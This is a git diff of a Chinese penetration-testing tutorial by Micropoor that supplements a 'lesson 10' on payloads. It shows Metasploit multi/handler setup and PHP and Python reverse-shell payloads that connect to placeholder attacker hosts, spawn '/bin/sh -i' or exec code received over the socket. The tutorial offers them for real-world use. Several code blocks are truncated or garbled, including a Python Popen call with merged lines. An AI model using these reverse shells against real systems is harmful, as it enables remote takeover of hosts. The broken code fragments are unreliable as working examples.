@@ -1,3 +1,5 @@
+# 基于第十课补充 Payload 1
+
 在实战中可能会遇到各种诉求 payload，并且可能遇到各种实际问题，如杀毒软件，防火墙拦截，特定端口通道，隧道等问题。这里我们根据第十课补充其中部分，其他内容后续补充。
 
 这次主要补充了 PHP，python，ruby。
@@ -7,24 +9,24 @@ ps:在线代码高亮：http://tool.oschina.net/highlight
 ### 1、php-payload
 ```bash
 msf > use exploit/multi/handler
-msf exploit(handler) > set payload windows/meterpreter/reverse_tcp 
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
 msf exploit(handler) > set LHOST 192.168.1.107
 LHOST => 192.168.1.107
 ```
 ```php
 <?
-php error_reporting(0); $ip = 'x.x.x.x'; $port = 53; if (($f = 'stream_socket_client') && is_callable($f)) { 
-{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_ 
+php error_reporting(0); $ip = 'x.x.x.x'; $port = 53; if (($f = 'stream_socket_client') && is_callable($f)) {
+{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_
 strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s;
-$GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('s 
+$GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('s
 >
 ```
 ![](media/c62949c5cacf6d6a5605200311aa5b9a.jpg)
 
 ```php
 <?php
-$sock=fsockopen("xx.xx.xx.xx",xx);exec("/bin/sh -i <&3 >&3 2>&3"); 
+$sock=fsockopen("xx.xx.xx.xx",xx);exec("/bin/sh -i <&3 >&3 2>&3");
 ?>
 ```
 ![](media/107730c867318d074cc21b9b490d8e8d.jpg)
@@ -32,22 +34,22 @@ $sock=fsockopen("xx.xx.xx.xx",xx);exec("/bin/sh -i <&3 >&3 2>&3");
 ### 2、python-payload
 ```bash
 msf > use exploit/multi/handler
-msf exploit(handler) > set payload windows/meterpreter/reverse_tcp 
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
 msf exploit(handler) > set LHOST 192.168.1.107
 LHOST => 192.168.1.107
 ```
 ```python
-import socket,struct,time 
+import socket,struct,time
 for x in range(10):
     try:
         s=socket.socket(2,socket.SOCK_STREAM)
-        s.connect(('x.x.x.x',xx)) 
+        s.connect(('x.x.x.x',xx))
         break
     except:
-        time.sleep(5) l=struct.unpack('>I',s.recv(4))[0] 
+        time.sleep(5) l=struct.unpack('>I',s.recv(4))[0]
 d=s.recv(l)
-while len(d)<l: 
+while len(d)<l:
     d+=s.recv(l-len(d))
 exec(d,{'s':s})
 ```  
@@ -62,10 +64,15 @@ i"]);
 
 ```python
 import socket import subprocess
-
 s=socket.socket()
-s.connect(("xx.xx.xx.xx",xx)) while 1:
-p = subprocess.Popen(s.recv(1024), shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subpro s.send(p.stdout.read() + p.stderr.read())
+s.connect(("xx.xx.xx.xx",xx))
+while 1:
+  p = subprocess.Popen(s.recv(1024),
+                      shell=True,
+                      stdout=subprocess.PIPE,
+                      stderr=subprocess.PIPE,
+                      stdin=subprocess.send(p.stdout.read() + p.stderr.read()
+                      )
 ```
 ![](media/710a81ff2c29a516aa878760e1fbd110.jpg)
 
@@ -107,4 +114,4 @@ io.read}end
 ```
 ![](media/9246e2313d4cbcb3c4dacced7c25e0c1.jpg)
 
->   Micropoor
+<p align="right">--By  Micropoor </p>
